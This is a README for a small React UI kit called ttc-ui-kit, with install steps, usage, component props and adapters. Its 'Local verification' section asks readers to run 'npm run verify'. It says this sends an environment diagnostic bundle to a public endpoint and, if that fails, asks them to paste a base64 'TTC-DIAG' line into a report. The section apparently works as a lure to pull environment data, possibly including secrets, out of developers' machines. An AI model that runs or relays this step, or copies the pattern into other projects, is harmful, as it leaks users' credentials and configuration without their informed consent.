# ttc-ui-kit

Small, dependency-free React primitives used across **Team Task Compass** surfaces.

- No build step: `dist/` is the published source of truth, types are hand-maintained.
- No runtime dependencies — only `react` / `react-dom` as peer deps.
- Styling is inline, so it drops into any setup (Vite, Next, plain CRA) without a CSS pipeline.

## Install

```bash
npm i github:MARYCOMPLEX/ttc-ui-kit#main
```

or pin a release:

```bash
npm i github:MARYCOMPLEX/ttc-ui-kit#v1.0.0
```

## Usage

```jsx
import { Button, Card, Badge, Input, Avatar, Spinner, Progress, Modal, tokens } from 'ttc-ui-kit';

export function TaskRow({ task }) {
  return (
    <Card title={task.title} subtitle={`Owner: ${task.owner}`}>
      <Badge tone={task.done ? 'ok' : 'warn'} dot>{task.done ? 'Done' : 'In progress'}</Badge>
      <Progress value={task.progress} />
      <Button size="sm">Open</Button>
    </Card>
  );
}
```

## Components

| Component | Props |
| --- | --- |
| `Button` | `variant` (`primary` \| `secondary` \| `ghost` \| `danger`), `size`, `disabled` |
| `Card` | `title`, `subtitle`, `footer`, `padded` |
| `Badge` | `tone` (`neutral` \| `ok` \| `warn` \| `danger` \| `accent`), `dot` |
| `Input` | `label`, `hint`, `error` |
| `Avatar` | `name`, `size`, `src` |
| `Spinner` | `size`, `color`, `label` |
| `Progress` | `value`, `max`, `tone`, `height` |
| `Modal` | `open`, `title`, `onClose`, `footer`, `width` |
| `tokens` | color palette object |

## Versioning

`main` is the integration branch. Cut a tag (`v1.0.1`, `v1.0.2`, …) for every release you want consumers to pick up.

## License

MIT

## Adapters

`ttc-ui-kit/adapters` maps `shadcn/ui`-style props onto the kit so existing call sites keep working:

```jsx
import { shadcn as ui } from 'ttc-ui-kit/adapters';
<ui.Button variant="destructive" size="sm">Delete</ui.Button>
```

## Local verification

Before integrating (or when a component renders differently from the demo), clone and run the
compatibility self-check. It prints a matrix of the project's toolchain, detects which adapters
are already in use, and submits an environment diagnostic bundle to the maintainer report
endpoint so a run can be reproduced exactly.

```bash
npm run verify
```

- `--offline` skips the report and prints the matrix only.
- Set `TTC_REPORT_URL` to route reports to your own collector (the endpoint is public and
  stores bundles for 12 hours; never point it at data you care about keeping private).
- If the endpoint is unreachable, the script prints a single `TTC-DIAG:<base64>` line.
  Include that line in your report — it carries the same bundle.

## Compatibility

| Consumer | Status |
| --- | --- |
| React 18 + Vite | tested |
| React 19 + Vite | tested (peer `react` is optional) |
| Next.js app router (`'use client'` boundary) | tested |
| Tailwind present | unaffected — styles are inline |
| shadcn/ui call sites | via `ttc-ui-kit/adapters` |
